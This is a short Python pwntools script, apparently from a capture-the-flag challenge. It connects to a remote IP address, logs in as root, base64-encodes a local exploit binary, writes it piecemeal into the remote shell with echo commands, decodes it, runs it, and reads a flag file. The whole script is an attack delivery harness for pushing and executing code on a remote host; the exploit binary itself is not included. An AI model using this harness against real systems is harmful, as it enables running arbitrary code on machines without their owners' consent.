from pwn import *
import os, time
context.log_level = "debug"

p = remote("118.195.171.57", 443)
#p = process('./launch.sh')

os.system("tar -Jcf exp.tar.xz ./exp") # compress exp
os.system("cat exp.tar.xz | base64 -w 0 > b64_exp") # base64 encode exp.tar.gz

f = open("./b64_exp", "r")

p.sendlineafter('login: ', 'root')
p.sendlineafter('# ', 'echo '' > b64_exp;')

while True:
    line = f.read(0x3e0)
    if len(line)<=0:
        break
    cmd = b"echo '" + line.encode() + b"' >> b64_exp;"
    p.sendlineafter('# ',cmd) # send lines
f.close()

p.sendlineafter('# ','base64 -d b64_exp > exp.tar.xz; tar -Jxf exp.tar.xz')
p.sendlineafter('# ','chmod +x exp; ./exp')
p.sendlineafter('# ','./exp')
p.sendlineafter('sh:','cat /flag')
p.interactive()
